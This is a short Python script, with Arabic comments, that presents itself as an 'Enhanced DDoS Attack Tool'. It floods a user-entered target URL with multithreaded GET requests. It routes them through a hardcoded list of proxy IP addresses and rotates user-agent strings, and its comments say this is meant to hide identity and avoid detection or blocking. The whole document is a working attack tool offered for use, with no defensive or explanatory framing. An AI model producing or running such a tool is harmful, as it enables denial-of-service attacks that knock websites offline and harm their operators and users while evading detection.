import requests
import threading
import time
import random
from queue import Queue

# إنشاء قائمة بعناوين الوكلاء (Proxies) لتحسين الفاعلية وإخفاء الهوية
proxies = [
    "http://51.79.50.22:9300",
    "http://185.199.229.156:7492",
    "http://45.76.115.156:8080",
    # أضف المزيد من الوكلاء هنا لتجنب الحظر
]

# رؤوس عشوائية لتقليل فرص الكشف
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
    # أضف المزيد من وكلاء المستخدم هنا
]

# قائمة عناوين URL لإجراء الهجوم
urls = Queue()

def ddos():
    while not urls.empty():
        url = urls.get()
        try:
            proxy = {"http": random.choice(proxies), "https": random.choice(proxies)}
            headers = {"User-Agent": random.choice(user_agents)}
            response = requests.get(url, headers=headers, proxies=proxy, timeout=5)
            print(f"Request sent to {url} | Status Code: {response.status_code}")
        except requests.exceptions.RequestException:
            print(f"Request to {url} failed.")
        urls.task_done()

def main():
    print("=== Enhanced DDoS Attack Tool ===")
    target = input("Enter the target URL: ").strip()
    thread_count = int(input("Enter the number of threads: "))
    request_count = int(input("Enter the total number of requests: "))

    if thread_count <= 0 or request_count <= 0:
        print("Error: The number of threads and requests must be greater than 0.")
        return

    for _ in range(request_count):
        urls.put(target)

    threads = []
    print(f"Starting attack on {target} with {thread_count} threads and {request_count} total requests.")

    start_time = time.time()

    for _ in range(thread_count):
        thread = threading.Thread(target=ddos)
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    elapsed_time = time.time() - start_time
    print(f"Attack completed in {elapsed_time:.2f} seconds.")
    print(f"Total requests attempted: {request_count}")

if __name__ == "__main__":
    main()
